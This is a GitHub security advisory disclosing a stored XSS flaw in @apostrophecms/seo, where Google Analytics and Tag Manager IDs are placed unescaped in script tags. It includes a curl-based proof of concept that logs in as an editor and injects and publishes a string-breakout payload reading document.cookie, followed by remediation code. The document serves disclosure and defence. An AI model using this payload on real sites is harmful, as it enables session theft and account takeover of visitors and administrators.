# [H] @apostrophecms/seo Vulnerable to Stored XSS via Unsanitized Google Analytics / GTM ID Injected into Script Tag

## Summary
Severity: High
Advisory: GHSA-wf43-fpp3-cf65
CVE: CVE-2026-53608
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-wf43-fpp3-cf65
Type: github-advisory

## Affected
- npm: `@apostrophecms/seo` — affected >=0 <1.5.0

## Details
<img width="1919" height="1046" alt="curl" src="https://github.com/user-attachments/assets/8aa19ff1-7f4b-44ee-83d5-d0dd1a0269f6" />
<img width="1919" height="775" alt="xss" src="https://github.com/user-attachments/assets/a65012e8-9b2f-416f-94df-c00493f2ca1d" />

### Summary

The `@apostrophecms/seo` package injects the Google Analytics Tracking ID (`seoGoogleTrackingId`) and Google Tag Manager ID (`seoGoogleTagManager`) directly into `<script>` tag bodies using JavaScript template literals without any sanitization or validation.

Any user with editor-level access (the default role for content managers) can set these fields to a malicious value, resulting in stored XSS that executes on every page for every visitor of the site.

### Details

The vulnerable code is in `node_modules/@apostrophecms/seo/lib/nodes.js`.

**Google Analytics (lines 218–224):**

```javascript
// seoGoogleTrackingId is inserted RAW into a <script> body — no escaping, no validation
body: [ {
  raw: `
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', '${global.seoGoogleTrackingId}');
`
} ]
```

**Google Tag Manager (lines 358–362):**

```javascript
body: [ {
  raw: `(function(w,d,s,l,i){...})(window,document,'script','dataLayer','${global.seoGoogleTagManager}');`
} ]
```

These nodes are rendered by `renderNodes()` in ApostropheCMS core (`modules/@apostrophecms/template/index.js` lines 1176–1177):

```javascript
if (node.raw != null) {
  return node.raw;  // returned verbatim, no escaping
}
```

The fields `seoGoogleTrackingId` and `seoGoogleTagManager` are defined as plain `type: 'string'` values with no pattern, minimum length, or maximum length validation in `seo-fields-global/index.js` lines 347–352.

ApostropheCMS's permission model (`@apostrophecms/permission/index.js` line 121) grants editor-level users the ability to edit and publish the global singleton, meaning a contributor does not need administrator access to exploit this issue.

### PoC

**Prerequisites:** ApostropheCMS with `@apostrophecms/seo` installed and `seoGoogleAnalytics: true` enabled in module options. An editor-level account.

#### Step 1 — Login as editor

```bash
curl -s -X POST http://TARGET/api/v1/@apostrophecms/login/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"editor","password":"password"}'
```

Response:

```json
{"token":"YOUR_TOKEN"}
```

#### Step 2 — Get the global document ID

```bash
curl -s -H "Authorization: Bearer YOUR_TOKEN" \
  http://TARGET/api/v1/@apostrophecms/global
```

Note the `_id` value ending in `:en:draft`.

#### Step 3 — Inject payload into Google Analytics ID

```bash
curl -s -X PATCH "http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"seoGoogleTrackingId":"G-FAKE'"'"'); alert(document.cookie); //"}'
```

#### Step 4 — Publish

```bash
curl -s -X POST "http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID/publish" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

#### Step 5 — Visit any page

The injected payload appears in `<head>` and executes:

```html
<script>
  gtag('config', 'G-FAKE'); alert(document.cookie); //');
</script>
```

### Impact

This is a Stored Cross-Site Scripting (XSS) vulnerability.

Any user with the editor role (the standard content management role in ApostropheCMS) can inject arbitrary JavaScript that executes for every visitor on every page of the site.

Impact includes:

- Session token theft of all visitors, including other editors and administrators
- Full account takeover via stolen administrator cookies
- Malware distribution, phishing overlays, or credential harvesting targeting site visitors
- Persistent compromise, as the payload remains active until manually removed

### Remediation

Validate the tracking ID fields against their expected formats before storage, and escape values before inserting them into script bodies.

```javascript
// Validate format before accepting
if (value && !/^(G-|UA-|GTM-)[A-Z0-9-]+$/i.test(value)) {
  throw new Error('Invalid tracking ID format');
}
```

```javascript
// Use safeJsonForScript instead of raw template literals
body: [ { json: global.seoGoogleTrackingId } ]
```

Or:

```javascript
// Escape the value before insertion
raw: `gtag('config', ${JSON.stringify(global.seoGoogleTrackingId)});`
```
<img width="1919" height="775" alt="xss" src="https://github.com/user-attachments/assets/4f1d6708-093a-4f74-828b-937dbeab62e8" />

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-wf43-fpp3-cf65
- https://nvd.nist.gov/vuln/detail/CVE-2026-53608
- https://github.com/apostrophecms/apostrophe/pull/5464
- https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b
- https://github.com/apostrophecms/apostrophe
